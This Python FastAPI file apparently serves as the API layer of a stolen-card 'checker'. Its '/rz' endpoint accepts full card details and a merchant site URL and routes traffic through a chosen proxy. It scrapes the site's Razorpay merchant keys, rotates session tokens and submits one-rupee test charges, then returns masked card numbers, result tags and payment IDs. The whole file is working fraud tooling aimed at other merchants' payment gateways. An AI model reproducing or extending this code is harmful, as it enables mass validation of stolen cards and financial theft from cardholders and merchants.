# api.py (minimal working version with /rz)
import os, json, time
from datetime import datetime
from typing import Optional, List
from fastapi import FastAPI, Query, HTTPException
from fastapi.responses import JSONResponse
from pydantic import BaseModel
import uvicorn

from checker_engine import *

app = FastAPI()

class GatewayCache:
    def __init__(self):
        self.site_url = ""; self.kh = ""; self.kid = ""; self.plid = ""; self.ppiid = ""; self.amount_paise = 100
        self.stoken = ""; self.token_uses = 0; self.last_setup = 0; self.setup_expiry = 300
    def is_valid(self):
        return all([self.kh, self.kid, self.plid, self.ppiid, self.stoken]) and time.time()-self.last_setup<self.setup_expiry
    def refresh_token(self):
        token, err = get_dynamic_session_token()
        if token: self.stoken = token; self.token_uses = 0; self.last_setup = time.time(); return True
        return False
    def setup_gateway(self, site_url, amount_rupees=1, proxy_string=""):
        global REQUESTS_PROXY, PLAYWRIGHT_PROXY
        if proxy_string:
            req_proxy, pw_proxy = setup_proxy(proxy_string)
            if req_proxy: REQUESTS_PROXY = req_proxy; PLAYWRIGHT_PROXY = pw_proxy
        kh, kid, plid, ppiid, err = extract_merchant_data(site_url)
        if err: return f"Failed to extract merchant data: {err}"
        stoken, err = get_dynamic_session_token()
        if err: return f"Failed to get session token: {err}"
        self.site_url = site_url; self.kh = kh; self.kid = kid; self.plid = plid; self.ppiid = ppiid
        self.amount_paise = amount_rupees*100; self.stoken = stoken; self.token_uses = 0; self.last_setup = time.time()
        return None

gateway = GatewayCache()

class SingleCheckRequest(BaseModel):
    cc: str
    site_url: Optional[str] = None
    amount: Optional[int] = 1
    proxy: Optional[str] = None

class CheckResponse(BaseModel):
    status: str; tag: str; message: str; elapsed: float; masked_card: str; payment_id: Optional[str] = None; full_response: dict; timestamp: str

def mask_card(cc):
    parts = cc.strip().split('|')
    return f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts[0])>10 else cc[:10]+"****"

@app.get("/rz", response_model=CheckResponse)
async def rz_get(cc: str = Query(...), site_url: Optional[str] = Query(None), amount: Optional[int] = Query(1), proxy: Optional[str] = Query(None)):
    return await _process_single(cc, site_url, amount, proxy)

@app.post("/rz", response_model=CheckResponse)
async def rz_post(request: SingleCheckRequest):
    return await _process_single(request.cc, request.site_url, request.amount, request.proxy)

@app.get("/health")
async def health():
    return {"status": "healthy", "gateway_ready": gateway.is_valid(), "timestamp": datetime.now().isoformat()}

async def _process_single(cc, site_url=None, amount=1, proxy=None):
    if not cc or '|' not in cc: raise HTTPException(status_code=400, detail="Invalid card format")
    if site_url:
        error = gateway.setup_gateway(site_url, amount, proxy or "")
        if error: raise HTTPException(status_code=400, detail=error)
    elif not gateway.is_valid():
        raise HTTPException(status_code=400, detail="Gateway not initialized")
    gateway.token_uses += 1
    if gateway.token_uses > 15: gateway.refresh_token()
    masked = mask_card(cc)
    start = time.time()
    try:
        tag, msg, elapsed, full_resp = process_card(cc, gateway.plid, gateway.ppiid, gateway.kid, gateway.kh, gateway.stoken, gateway.site_url, gateway.amount_paise)
        pid = full_resp.get("payment_id") or full_resp.get("razorpay_payment_id")
        return CheckResponse(status="success", tag=tag, message=msg, elapsed=elapsed, masked_card=masked, payment_id=pid, full_response=full_resp, timestamp=datetime.now().isoformat())
    except Exception as e:
        return CheckResponse(status="error", tag="ERROR", message=str(e)[:100], elapsed=round(time.time()-start,2), masked_card=masked, full_response={"error":str(e)}, timestamp=datetime.now().isoformat())
